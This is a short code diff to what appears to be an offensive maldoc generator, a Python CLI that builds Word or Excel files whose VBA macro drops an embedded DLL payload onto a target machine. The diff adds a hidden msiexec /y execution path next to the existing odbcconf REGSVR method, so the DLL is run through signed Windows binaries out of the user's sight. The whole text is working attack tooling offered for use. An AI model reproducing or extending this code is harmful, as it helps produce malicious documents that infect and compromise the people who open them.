@@ -31,6 +31,8 @@ Sub Run()
     Drop(path)
     {%- if 'odbcconf' in config['exe'] %}
     Shell "C:\Windows\SysNative\odbcconf.exe /a {REGSVR " & path & "}", vbHide
+    {%- elif 'msiexec' in config['exe'] %}
+    Shell "C:\Windows\SysNative\msiexec.exe /y " & path, vbHide
     {% endif %}
 End Sub
 
@@ -134,7 +136,7 @@ def generate_customxml(payload):
 @click.option('--dll', '-d', type=click.Path(exists=True), help='Embed DLL payload')
 @click.option('--doctype', '-t', default='doc', type=click.Choice(['doc', 'xl']))
 @click.option('--drop-path', '-p', type=str, default="C:\\Windows\\Tasks\\eva.dll", help='Path on a target system')
-@click.option('--execute', '-e', default='odbcconf', type=click.Choice(['odbcconf']))
+@click.option('--execute', '-e', default='odbcconf', type=click.Choice(['odbcconf','msiexec']))
 @click.option('--xml-out', '-x', type=click.Path(exists=False), default=None, help='Output CustomXML part')
 @click.option('--vba-out', '-v', type=click.Path(exists=False), default=None, help='Output VBA')
 def cli(dll, doctype, drop_path, execute, xml_out, vba_out):
